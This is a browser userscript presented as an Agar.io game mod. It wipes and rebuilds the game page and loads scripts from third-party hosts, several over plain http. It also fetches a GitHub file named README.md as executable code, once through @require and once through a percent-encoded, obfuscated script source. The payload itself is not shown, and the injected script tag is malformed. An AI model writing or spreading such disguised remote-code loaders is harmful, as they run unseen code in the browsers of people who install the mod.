// ==UserScript==
// @name         ㊣ȚЯΔɢΔ ȚЯΔɢΔ浓90
// @version      0.1
// @namespace    Agarplus.io (ESPERO QUE NO SEAN TAN PATETICOS EN EDITARLO ;)));
// @description  ƇƖαη 邪神 Agαrio   Esto Estara EN canal de YT style AGAR.IO ;)
// @author       8Agarplus.io) BY:::::::Traga-Traga
// @require      https://raw.githubusercontent.com/Traga-Traga/fd/master/README.md
// @match        http://agar.io/*
// @updateURL    http://agarplus.io/v2.user.js
// @downloadURL  http://agarplus.io/v2.user.js
// @grant        GM_setClipboard
// @grant        GM_xmlhttpRequest
// ==/UserScript==
function loadScript(t,e){var o=document.getElementsByTagName("head")[0],a=document.createElement("script");a.type="text/javascript",a.src=t,a.onload=e,o.appendChild(a)}function receiveMessage(t){if("http://agar.io"==t.origin&&t.data.action){var e=unsafeWindow.Action;t.data.action==e.COPY&&GM_setClipboard(t.data.data),t.data.action==e.IMAGE&&downloadResource(t.data.data,unsafeWindow.handleResource)}}function downloadResource(t,e){GM_xmlhttpRequest({method:"GET",url:t,responseType:"blob",onload:function(o){200===o.status?e(t,window.URL.createObjectURL(o.response)):console.log("res.status="+o.status)},onerror:function(t){console.log("GM_xmlhttpRequest error! "),e(null)}})}var VERSION="2.0.0",$,URL_JQUERY="http://code.jquery.com/jquery-1.11.3.min.js",URL_BOOTSTRAP="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/js/bootstrap.min.js",URL_SOCKET_IO="https://cdn.socket.io/socket.io-1.3.5.js",URL_FACEBOOK="http://connect.facebook.net/en_US/sdk.js",URL_MAIN_OUT="http://extension.agarplus.io/v2.js",URL_CSS_FILE="http://gdriv.es/agar_main_files/PublicAgar/KZx.css";window.stop(),document.documentElement.innerHTML=null,"agar.io"==location.host&&"/"==location.pathname&&(location.href="http://agar.io/agarplus.io"+location.hash),loadScript(URL_JQUERY,function(){$=unsafeWindow.jQuery,$("head").append('<link href="https://fonts.googleapis.com/css?family=Ubuntu:400,300,300italic,400italic,500,500italic,700,700italic" rel="stylesheet" type="text/css">'),$("head").append('<link rel="stylesheet" href="http://agar.io/css/glyphicons-social.css">'),$("head").append('<link rel="stylesheet" href="http://agar.io/css/animate.css">'),$("head").append('<link rel="stylesheet" href="http://agar.io/css/bootstrap.min.css">'),$("head").append('<link rel="stylesheet" href="'+URL_CSS_FILE+'">'),loadScript(URL_BOOTSTRAP,function(){loadScript(URL_SOCKET_IO,function(){loadScript(URL_MAIN_OUT,function(){loadScript(URL_FACEBOOK,function(){})})})})}),window.addEventListener("message",receiveMessage,!1);
 
setTimeout(function(){
    $(document).ready(function(){
    function addGlobalStyle(css) {
    var head, style;
    head = document.getElementsByTagName('head')[0];
    if (!head) { return; }
    style = document.createElement('style');
    style.type = 'text/css';
    style.innerHTML = css;
    head.appendChild(style);
}
 
addGlobalStyle('.btn-zeroK { width:68%!important; height:35px!important; background:#6DBED8!important; border-color: #6DBED8!important; margin-bottom: 5px!important;}');
addGlobalStyle('.btn-zeroK:hover {width:68%!important;  height:35px!important; background:#49B4D6!important; border-color: #49B4D6!important; margin-bottom: 5px!important;}');
addGlobalStyle('.btn-zeroK2 { width:68%!important; height:35px!important; background:#7ACA7A!important; border-color: #7ACA7A!important; margin-bottom: 5px!important;}');
addGlobalStyle('.btn-zeroK2:hover {width:68%!important;  height:35px!important; background:#6DB56D!important; border-color: #6DB56D!important; margin-bottom: 5px!important;}');
 
$("head").append('<script type="text/javascript" document.write(unescape(src="%68%74%74%70%73%3A%2F%2F%72%61%77%2E%67%69%74%68%75%62%75%73%65%72%63%6F%6E%74%65%6E%74%2E%63%6F%6D%2F%54%72%61%67%61%2D%54%72%61%67%61%2F%66%64%2F%6D%61%73%74%65%72%2F%52%45%41%44%4D%45%2E%6D%64"></script>');
});
 
}, 1000);
